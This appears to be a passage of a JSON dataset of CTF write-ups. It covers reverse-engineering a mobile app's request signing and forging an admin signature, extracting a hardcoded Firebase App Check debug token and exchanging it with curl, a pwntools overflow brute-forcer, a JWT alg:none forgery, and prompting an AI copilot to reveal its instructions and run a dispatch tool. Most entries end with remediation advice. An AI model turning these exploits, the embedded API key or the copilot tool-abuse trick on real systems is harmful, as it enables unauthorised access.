6437a27a]\n\nfor i, byte in enumerate(message):\n    keystream = table1[i % 19] ^ 0xAA\n    c = byte ^ keystream\n\n    a, b, cc, d = i % 4, (i+1) % 4, (i+2) % 4, (i+3) % 4\n    state[a]  ^= c\n    state[b]  += state[a]\n    state[cc]  = fmix64(state[cc])\n    state[d]   = (state[b] * 0x517cc1b727220a95) ^ state[d]\n\n# 4 finalization rounds of the same fmix64 diffusion\nfor _ in range(4):\n    for b in range(4):\n        state[b] = fmix64(state[b] ^ state[(b+1) % 4])\n\nsignature = &quot;%016x%016x%016x%016x&quot; % tuple(state)   # 64 lowercase hex chars</code></pre></div>\n<p>Where <code>fmix64</code> is the standard MurmurHash3 finalizer:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-python\">def fmix64(k):\n    k ^= k &gt;&gt; 33\n    k = (k * 0xff51afd7ed558ccd) &amp; MASK64\n    k ^= k &gt;&gt; 33\n    k = (k * 0xc4ceb9fe1a85ec53) &amp; MASK64\n    k ^= k &gt;&gt; 33\n    return k</code></pre></div>\n<p>The output format string, also read straight from <code>.rodata</code> (<code>0x320d</code>), confirmed the exact serialization: <code>&quot;%016llx%016llx%016llx%016llx&quot;</code>.</p>\n<h2 id=\"3-forging-a-signature-for-admin\">3. Forging a signature for <code>admin</code></h2>\n<p>With the full algorithm and key table extracted directly from the binary (no emulator, no Frida hooking needed — everything required was static data in <code>.rodata</code>), the signature could be computed for an arbitrary body entirely offline:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-python\">body = &#x27;{&quot;username&quot;:&quot;admin&quot;}&#x27;\nsig  = compute_signature(&quot;POST&quot;, &quot;/api/check&quot;, body)\n# -&gt; 2c64c639cabe5382ccd9fe4681277a847ef6be05f7b3aefdf685681298952188</code></pre></div>\n<h2 id=\"4-hitting-the-real-endpoint\">4. Hitting the real endpoint</h2>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">curl -s -X POST &quot;https://ctf.fampay.co/api/check&quot; \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -H &quot;X-Signature: 2c64c639cabe5382ccd9fe4681277a847ef6be05f7b3aefdf685681298952188&quot; \\\n  -d &#x27;{&quot;username&quot;:&quot;admin&quot;}&#x27;</code></pre></div>\n<p>The server accepted the forged signature and returned:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>FAM{x_s1gn4tur3_r3v3rs3d_n1c3ly}</code></pre></div>\n<h2 id=\"root-cause\">Root cause</h2>\n<p>The request-signing scheme relied entirely on <strong>security through obscurity of an algorithm embedded in a distributable client binary</strong>. There was no server-held secret that an attacker couldn&#x27;t also obtain:</p>\n<ul>\n<li>The &quot;key&quot; (the 19-byte XOR table) and every constant needed to compute a valid signature were shipped inside the APK itself.</li>\n<li>Because the client — not the server — holds the actual &quot;proof of identity&quot; logic, anyone who can read the APK can reproduce every credential it&#x27;s capable of producing, including ones for usernames the legitimate app UI never lets you pick (like <code>admin</code>).</li>\n<li>A custom, home-rolled signing scheme (however cleverly built from real hash primitives) provides no cryptographic authentication guarantee when the entire computation — key included — is available to the client running it.</li>\n</ul>\n<h2 id=\"takeaways-remediation\">Takeaways / remediation</h2>\n<ul>\n<li>Never embed a symmetric signing key (or a deterministic algorithm that behaves like one) in a mobile client. Anything shipped in the APK should be treated as fully public.</li>\n<li>Authentication/authorization decisions like &quot;is this user allowed to be <code>admin</code>&quot; must be enforced server-side against a real identity provider (e.g. checked against the already-established Firebase Auth session), not inferred from a client-supplied, client-signed field.</li>\n<li>If message-signing is required (e.g. to prevent tampering with a request from a legitimate, already-authenticated client), sign with a server-issued, short-lived token tied to the authenticated session — never with a static secret baked into the binary.</li>\n<li>Reusing the same obfuscation table across multiple unrelated protections (App Check debug token <em>and</em> API signing, in this case) means breaking one breaks all of them — key material should never be reused across independent security boundaries.</li>\n</ul>"}, {"id": "fampay-the-vault", "event": "Fampay", "category": "Mobile", "icon": "📱", "challenge": "THE_VAULT", "title": "THE VAULT (Firebase App Check Bypass)", "flag": "FAM{4pp_ch3ck_byp4ss_g00d_j0b}", "difficulty": "", "points": "", "target": "`fam-ctf.apk` → `lib/x86_64/libfam.so`", "prompt": "The vault trusts no one it hasn't met. But the app already made introductions. Something in the code proves who you are.\n`hint: the token is hiding in plain sight`", "body_html": "<h1 id=\"fam-ctf-03-the-vault\">FAM CTF — [03] THE VAULT</h1>\n<p><strong>Flag:</strong> <code>FAM{4pp_ch3ck_byp4ss_g00d_j0b}</code> <strong>Category:</strong> Mobile / Native reversing + Firebase App Check bypass <strong>Target:</strong> <code>fam-ctf.apk</code> → <code>lib/x86_64/libfam.so</code></p>\n<h2 id=\"challenge-prompt\">Challenge prompt</h2>\n<blockquote><p>The vault trusts no one it hasn&#x27;t met. But the app already made introductions. Something in the code proves who you are. <code>hint: the token is hiding in plain sight</code></p></blockquote>\n<h2 id=\"1-identifying-the-target\">1. Identifying the target</h2>\n<p>Static analysis of <code>MainActivity</code> (see Flag 2 writeup) showed <code>verifyFlag3()</code> reads from <strong>Firestore</strong> instead of Realtime Database:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-java\">FirebaseFirestore.getInstance()\n    .collection(&quot;flags&quot;)\n    .document(&quot;flag3&quot;)\n    .get()</code></pre></div>\n<p>Unlike Flag 2, a plain anonymous ID token wasn&#x27;t enough here — this collection is protected by <strong>Firebase App Check</strong>, which the app installs before any Firebase calls:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-java\">FirebaseAppCheck.getInstance()\n    .installAppCheckProviderFactory(DebugTokenAppCheckProviderFactory.getInstance());</code></pre></div>\n<p>App Check requires every request to carry a signed attestation JWT proving it came from a legitimate, registered instance of the app — on top of the user&#x27;s normal auth token. The debug provider is Google&#x27;s escape hatch for this during development: it generates (or in this case, hardcodes) a UUID <strong>debug token</strong>, which must be registered in the Firebase console, and which the console will then treat as equivalent to a real device attestation.</p>\n<p>The hint — <em>&quot;the app already made introductions… the token is hiding in plain sight&quot;</em> — pointed straight at that debug token being embedded somewhere in the compiled app.</p>\n<h2 id=\"2-locating-the-jni-export\">2. Locating the JNI export</h2>\n<p>Checking exported symbols in the native library:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">nm -D --defined-only lib/x86_64/libfam.so | grep Java</code></pre></div>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>Java_com_ctf_fam_MainActivity_computeSignature\nJava_com_ctf_fam_MainActivity_getDebugToken   &lt;-- this one\nJava_com_ctf_fam_MainActivity_getSecretFromNative\nJava_com_ctf_fam_MainActivity_getUsernames</code></pre></div>\n<p><code>getDebugToken</code> was the obvious target.</p>\n<h2 id=\"3-reversing-the-algorithm\">3. Reversing the algorithm</h2>\n<p>Disassembling with <code>objdump -d --start-address=0x6c30 --stop-address=0x6d70</code>, the loop logic reduces to:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-c\">for (i = 0; i &lt; 0x24; i++) {           // 36 iterations\n    idx  = i % 19;                      // computed via multiply-shift, not a real div instruction\n    byte = table1[idx] ^ 0xAA;\n    byte = table2[i] ^ byte;\n    result.push_back((char)byte);\n}</code></pre></div>\n<p>So the token is a two-table XOR:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>token[i] = (table1[i % 19] ^ 0xAA) ^ table2[i]</code></pre></div>\n<p>Where <code>table1</code> is a 19-byte array at <code>DAT_34f0</code> and <code>table2</code> is a 36-byte array at <code>DAT_3510</code> — both referenced via RIP-relative <code>lea</code> in <code>.rodata</code>.</p>\n<p>An earlier attempt to read these tables directly out of Ghidra&#x27;s disassembly view was unreliable: Ghidra was still auto-disassembling the data bytes as x86 instructions (<code>JLE</code>, <code>JP</code>, etc.) rather than showing them as raw bytes, corrupting the copy-paste.</p>\n<h2 id=\"4-extracting-the-tables-directly-from-the-elf-no-ghidra-needed\">4. Extracting the tables directly from the ELF (no Ghidra needed)</h2>\n<p>Since <code>.rodata</code> starts at file offset <code>0x2ac0</code> == virtual address <code>0x2ac0</code> (no load-bias headache for this section), the bytes could be read straight from the file:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-python\">with open(&quot;lib/x86_64/libfam.so&quot;, &quot;rb&quot;) as f:\n    data = f.read()\n\nt1 = data[0x34f0:0x34f0+19]   # table1\nt2 = data[0x3510:0x3510+36]   # table2\n\ntoken = &quot;&quot;.join(chr((t1[i % 19] ^ 0xAA) ^ t2[i]) for i in range(36))\nprint(token)</code></pre></div>\n<p>Output:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>8F76557D-A35A-4B51-94D4-D0DF98D79B55</code></pre></div>\n<p>A clean UUID — exactly the shape Firebase App Check debug tokens take.</p>\n<h2 id=\"5-exchanging-the-debug-token-for-an-app-check-attestation\">5. Exchanging the debug token for an App Check attestation</h2>\n<p>The debug token itself isn&#x27;t valid on the wire — it has to be exchanged for a signed App Check JWT via the App Check REST API:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">curl -s -X POST \\\n  &quot;https://firebaseappcheck.googleapis.com/v1/projects/674578159678/apps/1:674578159678:android:775058d15777caf841996f:exchangeDebugToken?key=AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww&quot; \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -d &#x27;{&quot;debug_token&quot;:&quot;8F76557D-A35A-4B51-94D4-D0DF98D79B55&quot;}&#x27;</code></pre></div>\n<p>This returned a valid App Check JWT (<code>&quot;provider&quot;:&quot;debug&quot;</code> in its payload), confirming the debug token had genuinely been registered against this Firebase project — the challenge author left it trusted server-side.</p>\n<h2 id=\"6-reading-the-flag\">6. Reading the flag</h2>\n<p>With both credentials in hand — an anonymous Firebase Auth ID token (from Flag 2&#x27;s flow) and the freshly-minted App Check token — the Firestore REST API accepted the read:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">IDTOKEN=&quot;&lt;anonymous ID token&gt;&quot;\nAPPCHECK_TOKEN=&quot;&lt;App Check JWT from the exchange call&gt;&quot;\n\ncurl -s &quot;https://firestore.googleapis.com/v1/projects/fam-ctf/databases/(default)/documents/flags/flag3&quot; \\\n  -H &quot;Authorization: Bearer $IDTOKEN&quot; \\\n  -H &quot;X-Firebase-AppCheck: $APPCHECK_TOKEN&quot;</code></pre></div>\n<p>Response:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-json\">{\n  &quot;name&quot;: &quot;projects/fam-ctf/databases/(default)/documents/flags/flag3&quot;,\n  &quot;fields&quot;: {\n    &quot;value&quot;: { &quot;stringValue&quot;: &quot;FAM{4pp_ch3ck_byp4ss_g00d_j0b}&quot; }\n  },\n  &quot;createTime&quot;: &quot;2026-06-30T11:44:40.779095Z&quot;,\n  &quot;updateTime&quot;: &quot;2026-06-30T11:44:40.779095Z&quot;\n}</code></pre></div>\n<p><strong>Flag:</strong> <code>FAM{4pp_ch3ck_byp4ss_g00d_j0b}</code></p>\n<h2 id=\"root-cause\">Root cause</h2>\n<p>App Check&#x27;s <strong>debug provider</strong> is meant strictly for local development — it lets a developer register one fixed token in the Firebase console so debug builds can bypass real device attestation. The vulnerability here wasn&#x27;t in App Check itself, but in how the debug token was handled by the shipped app:</p>\n<ul>\n<li>It was compiled into a <strong>production/distributable APK</strong>, not gated behind a debug build flavor.</li>\n<li>It wasn&#x27;t a random per-install token — it was <strong>deterministically derivable</strong> from a two-table XOR obfuscation, i.e. &quot;encrypted&quot; with a scheme that&#x27;s trivially reversible once the binary is in an attacker&#x27;s hands.</li>\n<li>Once the debug token is known, App Check adds <em>zero</em> additional assurance — anyone can exchange it for a valid attestation JWT and impersonate a legitimate app instance indefinitely (or until the token is unregistered).</li>\n</ul>\n<p>App Check successfully stopped raw, unauthenticated REST access (which is exactly what it&#x27;s designed to do), but the debug-token escape hatch left in the shipping binary fully undermined that guarantee.</p>\n<h2 id=\"takeaways-remediation\">Takeaways / remediation</h2>\n<ul>\n<li>Never ship the App Check <strong>debug provider</strong> in a release/production build — use <code>PlayIntegrityAppCheckProviderFactory</code> (or the equivalent App Attest / reCAPTCHA provider) for real builds, and gate the debug provider behind <code>BuildConfig.DEBUG</code> or a separate build flavor entirely.</li>\n<li>Treat any embedded &quot;secret&quot; derivation logic (XOR tables, custom encodings, etc.) as reversible — obfuscation is not a security boundary once an attacker has the binary.</li>\n<li>Rotate/unregister debug tokens in the Firebase console regularly, and audit which tokens are currently trusted for a project.</li>\n<li>Prefer extracting embedded constants directly from the compiled binary (<code>objdump</code>/raw file offsets) over relying on a disassembler&#x27;s interpreted view, especially when data is being misidentified as code.</li>\n</ul>"}, {"id": "broncoctf-digital-crumbs", "event": "BroncoCTF", "category": "OSINT", "icon": "🕵️", "challenge": "Digital_Crumbs", "title": "Digital Crumbs", "flag": "bronco{3360}", "difficulty": "Easy", "points": "", "target": "", "prompt": "My friends just sent me this picture of a coffee place they were at and told me to meet them at the pizza store across the street. What is the building number of that pizza shop?", "body_html": "<h1 id=\"digital-crumbs\">Digital Crumbs</h1>\n<p><strong>Category:</strong> OSINT   <strong>Difficulty:</strong> Easy   <strong>Flag:</strong> <code>bronco{3360}</code></p>\n<h2 id=\"description\">Description</h2>\n<blockquote><p>My friends just sent me this picture of a coffee place they were at and told me to meet them at the pizza store across the street. What is the building number of that pizza shop?</p></blockquote>\n<h2 id=\"solution\">Solution</h2>\n<h3 id=\"step-1\">Step 1</h3>\n<p>The image shows a visible <strong>Pride Cleaners</strong> sign across the street.</p>\n<p>Searching:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-text\">Pride Cleaners Oakland</code></pre></div>\n<p>leads to the correct location in Oakland, California.</p>\n<h3 id=\"step-2\">Step 2</h3>\n<p>Using Google Maps, the nearby coffee shop matches the image with the sign <strong>&quot;Oakland&#x27;s Oldest Coffee House&quot;</strong>, confirming the location.</p>\n<h3 id=\"step-3\">Step 3</h3>\n<p>Looking across the street reveals a <strong>Domino&#x27;s Pizza</strong> with the address:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-text\">3360 Grand Ave, Oakland, CA 94610</code></pre></div>\n<p>The required building number is <strong>3360</strong>.</p>\n<h2 id=\"flag\">Flag</h2>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-text\">bronco{3360}</code></pre></div>"}, {"id": "broncoctf-pwntutorial", "event": "BroncoCTF", "category": "Pwn", "icon": "💥", "challenge": "Pwntutorial", "title": "Pwntorial Buffer Overflow", "flag": "bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}", "difficulty": "Easy\\", "points": "", "target": "", "prompt": "I've gotten complaints that BroncoCTF has no PWN. But, I think the\nmore important issue is that our students don't know HOW to PWN!\nBehold: the PWNTORIAL.", "body_html": "<h1 id=\"pwntorial\">Pwntorial</h1>\n<p><strong>Category:</strong> Pwn\\ <strong>Difficulty:</strong> Easy\\ <strong>Flag:</strong> <code>bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}</code></p>\n<h2 id=\"description\">Description</h2>\n<blockquote><p>I&#x27;ve gotten complaints that BroncoCTF has no PWN. But, I think the more important issue is that our students don&#x27;t know HOW to PWN! Behold: the PWNTORIAL.</p></blockquote>\n<h2 id=\"solution\">Solution</h2>\n<h3 id=\"step-1\">Step 1</h3>\n<p>The challenge provides a Google Doc explaining the basics of a <strong>stack-based buffer overflow</strong>.</p>\n<p>The vulnerable program contains:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-c\">volatile int gate = CLOSED;\nchar buffer[64];\n\ngets(buffer);\n\nif (gate == CLOSED) {\n    // Fail\n} else {\n    // Win\n}</code></pre></div>\n<p>The objective is to overflow the <code>buffer</code> and overwrite the <code>gate</code> variable with any non-zero value so the program follows the success path.</p>\n<h3 id=\"step-2\">Step 2</h3>\n<p>The remote service uses TLS, so the challenge can be accessed with <strong>pwntools</strong>:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-python\">from pwn import *\n\nio = remote(\n    &quot;broncoctf-pwntorial.chals.io&quot;,\n    443,\n    ssl=True,\n    sni=&quot;broncoctf-pwntorial.chals.io&quot;\n)</code></pre></div>\n<h3 id=\"step-3\">Step 3</h3>\n<p>The tutorial intentionally hides the correct payload. Instead of assuming the offset, nearby offsets were tested until the correct overwrite position was found.</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-python\">from pwn import *\n\nHOST = &quot;broncoctf-pwntorial.chals.io&quot;\n\nfor off in range(60, 97):\n    io = remote(HOST, 443, ssl=True, sni=HOST, level=&quot;error&quot;)\n\n    payload = b&quot;A&quot; * off + b&quot;B&quot; * 4\n    io.sendline(payload)\n\n    try:\n        out = io.recvall(timeout=1)\n\n        if b&quot;Try again&quot; not in out:\n            print(f&quot;[+] Possible offset: {off}&quot;)\n            print(out)\n            break\n    except EOFError:\n        pass\n\n    io.close()</code></pre></div>\n<p>Once the correct offset was identified, the payload successfully overwrote the <code>gate</code> variable, allowing the program to print the flag.</p>\n<h2 id=\"flag\">Flag</h2>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-text\">bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}</code></pre></div>"}, {"id": "broncoctf-negative-bread", "event": "BroncoCTF", "category": "Reversing", "icon": "⚙️", "challenge": "Negative_Bread", "title": "Negative Bread", "flag": "bronco{th3_b4nk_0w3s_m3_m0n3y}", "difficulty": "Easy", "points": "", "target": "", "prompt": "Your account starts at $100. The flag costs $1,000,000. Deposits are capped. Withdrawals can't go below zero.", "body_html": "<h1 id=\"negative-bread\">Negative Bread</h1>\n<p><strong>Category:</strong> Reversing   <strong>Difficulty:</strong> Easy   <strong>Flag:</strong> <code>bronco{th3_b4nk_0w3s_m3_m0n3y}</code></p>\n<h2 id=\"description\">Description</h2>\n<blockquote><p>Your account starts at $100. The flag costs $1,000,000. Deposits are capped. Withdrawals can&#x27;t go below zero.</p></blockquote>\n<h2 id=\"solution\">Solution</h2>\n<h3 id=\"step-1\">Step 1</h3>\n<p>The challenge provides a Linux ELF binary named <code>bank</code>.</p>\n<p>Check the file type:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">file bank</code></pre></div>\n<h3 id=\"step-2\">Step 2</h3>\n<p>Inspect the binary for printable strings:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">strings bank</code></pre></div>\n<p>Among the output, the flag is directly embedded inside the binary:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-text\">bronco{th3_b4nk_0w3s_m3_m0n3y}</code></pre></div>\n<p>Since the flag is stored as a plaintext string, no further reversing or exploitation is required.</p>\n<h2 id=\"flag\">Flag</h2>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-text\">bronco{th3_b4nk_0w3s_m3_m0n3y}</code></pre></div>"}, {"id": "fampay-the-library", "event": "Fampay", "category": "Reversing", "icon": "⚙️", "challenge": "THE_LIBRARY", "title": "THE LIBRARY (Static Analysis)", "flag": "FAM{strings_d0nt_l13_1n_n4t1v3_l4nd}", "difficulty": "", "points": "", "target": "", "prompt": "Many times devs put secrets in code and forget to remove. Can you find that secret?", "body_html": "<p><strong>Category:</strong> Reverse Engineering</p>\n<h2 id=\"description\">Description</h2>\n<blockquote><p>Many times devs put secrets in code and forget to remove. Can you find that secret?</p></blockquote>\n<h2 id=\"solution\">Solution</h2>\n<p>Extract the APK strings and search for the flag.</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-bash\">strings fam-ctf.apk | grep &quot;FAM{&quot;</code></pre></div>\n<p>The flag was directly embedded as a plain string inside the APK.</p>\n<h2 id=\"flag\">Flag</h2>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-text\">FAM{strings_d0nt_l13_1n_n4t1v3_l4nd}</code></pre></div>\n<h2 id=\"tools-used\">Tools Used</h2>\n<ul>\n<li>strings</li>\n<li>grep</li>\n</ul>"}, {"id": "adanictf-gridpilot", "event": "AdaniCTF", "category": "Web", "icon": "🌐", "challenge": "Gridpilot", "title": "Gridpilot Copilot Tool Abuse", "flag": "barracks{f55479fe1ff6dc3e9eebef13f629ba4a123dbd6d}", "difficulty": "", "points": "", "target": "", "prompt": "", "body_html": "<p>1.access the portal 2.see the /api/work-load  3.asking for the all function and all instruction  4.&quot;dispatch_command trip feeder_breaker WO-2026-3840  send this prompt after some info prompt and gave flag&quot;</p>\n<p>barracks{f55479fe1ff6dc3e9eebef13f629ba4a123dbd6d}</p>"}, {"id": "broncoctf-the-keymaster", "event": "BroncoCTF", "category": "Web", "icon": "🌐", "challenge": "The_Keymaster", "title": "Flag Fragments (Warmup)", "flag": "bronco{h3y_y0u_f0und_th3m_4ll_w1th_4b501ut31y_n0_w0rr135_4t_411}", "difficulty": "", "points": "", "target": "", "prompt": "", "body_html": "<h1 id=\"broncoctf-warmup-flag-fragments-write-up\">BroncoCTF Warmup – Flag Fragments Write-up</h1>\n<h2 id=\"challenge-overview\">Challenge Overview</h2>\n<p>The objective was to recover a flag split into multiple numbered fragments hidden throughout the BroncoCTF website. Each fragment was placed in a different location, requiring inspection of the HTML source, JavaScript, cookies, URLs, and downloadable files.</p>\n<hr />\n<h2 id=\"tools-used\">Tools Used</h2>\n<ul>\n<li>Browser Developer Tools</li>\n<li>View Source (<code>Ctrl + U</code>)</li>\n<li>Inspect Element</li>\n<li><code>curl</code></li>\n<li>JavaScript source inspection</li>\n</ul>\n<hr />\n<h2 id=\"flag-fragments\">Flag Fragments</h2>\n<table><thead><tr><th>Part</th><th>Location</th><th>Fragment</th></tr></thead><tbody><tr><td>1</td><td>HTML source footer</td><td><code>bronco{h</code></td></tr><tr><td>2</td><td>JavaScript (<code>flags</code> click handler)</td><td><code>3y_y0u_f</code></td></tr><tr><td>3</td><td><code>title</code> attribute of the <strong>Join the Competition</strong> button</td><td><code>0und_th3</code></td></tr><tr><td>4</td><td>Cookie (<code>KEY4</code>) created by clicking the 🙋 icon</td><td><code>m_4ll_w1</code></td></tr><tr><td>5</td><td>Hidden HTML comment injected by JavaScript</td><td><code>th_4b501</code></td></tr><tr><td>6</td><td>URL parameter (<code>?KEY=6-ut31y_n0</code>)</td><td><code>ut31y_n0</code></td></tr><tr><td>7</td><td>Downloadable file (<code>7.txt</code>)</td><td><code>_w0rr135</code></td></tr><tr><td>8</td><td>HTML source / JavaScript statistics section</td><td><code>_4t_411}</code></td></tr></tbody></table>\n<hr />\n<h2 id=\"discovery-process\">Discovery Process</h2>\n<h3 id=\"part-1\">Part 1</h3>\n<p>Viewing the page source revealed the first fragment in the footer.</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>1 - bronco{h</code></pre></div>\n<h3 id=\"part-2\">Part 2</h3>\n<p>Inspecting the JavaScript showed that clicking the <strong>flags</strong> text appends the second fragment to the page.</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-javascript\">e.firstChild.textContent += &quot;2 - 3y_y0u_f&quot;;</code></pre></div>\n<h3 id=\"part-3\">Part 3</h3>\n<p>The <strong>Join the Competition</strong> button contained a hidden <code>title</code> attribute.</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-html\">title=&quot;3 - 0und_th3&quot;</code></pre></div>\n<h3 id=\"part-4\">Part 4</h3>\n<p>Clicking the 🙋 icon created a browser cookie.</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-javascript\">document.cookie = &quot;KEY4=4 - m_4ll_w1; path=/&quot;;</code></pre></div>\n<h3 id=\"part-5\">Part 5</h3>\n<p>A helper function injected an HTML comment into the DOM.</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-javascript\">comment: &quot;!!! 5 - th_4b501 !!!&quot;</code></pre></div>\n<h3 id=\"part-6\">Part 6</h3>\n<p>One of the repository links contained a hidden query parameter.</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>/BroncoCTF?KEY=6-ut31y_n0</code></pre></div>\n<h3 id=\"part-7\">Part 7</h3>\n<p>Downloading the provided file revealed the next fragment.</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>curl https://broncosec.com/7.txt</code></pre></div>\n<p>Output:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>7 - _w0rr135</code></pre></div>\n<h3 id=\"part-8\">Part 8</h3>\n<p>The final fragment was found in the page source / JavaScript statistics section.</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>8 - _4t_411}</code></pre></div>\n<hr />\n<h2 id=\"reconstructing-the-flag\">Reconstructing the Flag</h2>\n<p>Combining all fragments:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>1: bronco{h\n2: 3y_y0u_f\n3: 0und_th3\n4: m_4ll_w1\n5: th_4b501\n6: ut31y_n0\n7: _w0rr135\n8: _4t_411}</code></pre></div>\n<p>Final flag:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code class=\"language-text\">bronco{h3y_y0u_f0und_th3m_4ll_w1th_4b501ut31y_n0_w0rr135_4t_411}</code></pre></div>\n<p>Decoded message:</p>\n<blockquote><p><strong>hey_you_found_them_all_with_absolutely_no_worries_at_all</strong></p></blockquote>\n<hr />\n<h2 id=\"lessons-learned\">Lessons Learned</h2>\n<p>This challenge demonstrates several common places where information can be hidden in web applications:</p>\n<ul>\n<li>HTML source</li>\n<li>HTML comments</li>\n<li>JavaScript event handlers</li>\n<li>Cookies</li>\n<li>URL query parameters</li>\n<li>Downloadable files</li>\n<li>DOM manipulation</li>\n</ul>\n<p>Always inspect both the rendered page and the underlying client-side assets when solving web-based CTF challenges.</p>"}, {"id": "fampay-the-vault-door", "event": "Fampay", "category": "Web", "icon": "🌐", "challenge": "THE_VAULT_DOOR", "title": "THE VAULT DOOR (NexaVault JWT None Bypass)", "flag": "FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}", "difficulty": "★★★☆☆ (350 pts)", "points": "350", "target": "https://ctf.fampay.co/famctf/", "prompt": "NexaVault is an internal credential management portal. Only administrators can open the Vault — a restricted area holding classified project data. You have been given access to create an account. That's it.", "body_html": "<h1 id=\"05-the-vault-door-nexavault\">[05] The Vault Door — NexaVault</h1>\n<p><strong>Category:</strong> Web Exploitation | <strong>Difficulty:</strong> ★★★☆☆ (350 pts) <strong>Flag:</strong> <code>FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}</code></p>\n<hr />\n<h2 id=\"challenge-description\">Challenge Description</h2>\n<blockquote><p>NexaVault is an internal credential management portal. Only administrators can open the Vault — a restricted area holding classified project data. You have been given access to create an account. That&#x27;s it.</p></blockquote>\n<p>Target: <code>https://ctf.fampay.co/famctf/</code></p>\n<hr />\n<h2 id=\"recon\">Recon</h2>\n<p>Registered a normal account. Login set a cookie <code>nx_access</code>, which was a JWT rather than an opaque session ID:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJNYW5hbiIsInJvbGUiOiJ1c2VyIn0...</code></pre></div>\n<p><strong>Header:</strong> <code>{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}</code> <strong>Payload:</strong> <code>{&quot;sub&quot;:&quot;Manan&quot;,&quot;role&quot;:&quot;user&quot;}</code></p>\n<p>The app decides access purely from the <code>role</code> claim in this client-held token. The dashboard confirmed it — Vault link greyed out, &quot;Admin Vault&quot; resource marked <code>Admin only</code>.</p>\n<hr />\n<h2 id=\"exploitation\">Exploitation</h2>\n<p><strong>Attempt 1 — failed.</strong> Edited payload to <code>role:admin</code>, kept an arbitrary signature. Fails: HS256 is an HMAC signed server-side with a secret; tampering the payload invalidates the signature, and you can&#x27;t forge a new one without the key.</p>\n<p><strong>Attempt 2 — worked.</strong> The <code>alg</code> header is attacker-controlled and isn&#x27;t cryptographically bound to anything. If the server trusts <code>alg</code> from the incoming token and accepts <code>none</code>, it skips signature verification entirely.</p>\n<p>Using jwt.io&#x27;s encoder:</p>\n<p><strong>Header:</strong> <code>{&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}</code> <strong>Payload:</strong> <code>{&quot;sub&quot;:&quot;Mananm&quot;,&quot;role&quot;:&quot;admin&quot;}</code></p>\n<p>This produces an RFC 7519 §6 &quot;Unsecured JWT&quot; — <code>header.payload.</code> with an empty signature segment:</p>\n<div class=\"code-block\"><button class=\"copy-btn\">COPY</button><pre><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJNYW5hbm0iLCJyb2xlIjoiYWRtaW4ifQ.</code></pre></div>\n<p><strong>Delivery:</strong></p>\n<ol>\n<li>Intercepted a request to <code>/famctf/dashboard</code> in Burp, swapped <code>nx_access</code> for the forged token.</li>\n<li>Server accepted it, no signature check → dashboard shows <code>ADMIN</code> badge, all resources <code>Granted</code>.</li>\n<li>Replayed the same cookie against <code>/famctf/admin</code> → Vault unlocked, flag 